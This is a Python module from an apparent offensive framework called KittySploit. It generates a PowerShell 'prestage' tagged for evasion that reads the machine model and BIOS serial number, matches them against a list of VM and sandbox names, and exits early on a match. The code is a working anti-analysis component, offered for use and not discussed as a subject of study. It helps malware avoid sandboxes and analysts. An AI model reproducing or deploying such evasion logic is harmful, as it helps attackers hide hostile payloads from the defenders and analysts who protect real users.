#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *


class Module(Prestage):
    PRESTAGE_ID = "check_vm"

    __info__ = {
        "name": "Check VM / Sandbox (PowerShell)",
        "description": "Exit early when common VM or sandbox indicators are detected",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["powershell"],
        "dependencies": [],
        "tags": ["evasion", "prestage", "offline", "powershell"],
    }

    def generate_powershell(self, context: Dict[str, Any] = None) -> str:
        return """
$ErrorActionPreference='SilentlyContinue'
$markers=@('vmware','virtualbox','vbox','qemu','xen','hyper-v','kvm','parallels','bochs','innotek','virtual')
$hit=$false
try {
  $blob=(Get-CimInstance Win32_ComputerSystem -ErrorAction Stop | Select-Object -ExpandProperty Model).ToLower()
  foreach($m in $markers){ if($blob -like "*$m*"){ $hit=$true; break } }
} catch {}
if(-not $hit){
  try {
    $bios=(Get-CimInstance Win32_BIOS -ErrorAction Stop | Select-Object -ExpandProperty SerialNumber).ToLower()
    foreach($m in $markers){ if($bios -like "*$m*"){ $hit=$true; break } }
  } catch {}
}
if($hit){ exit 0 }
""".strip()
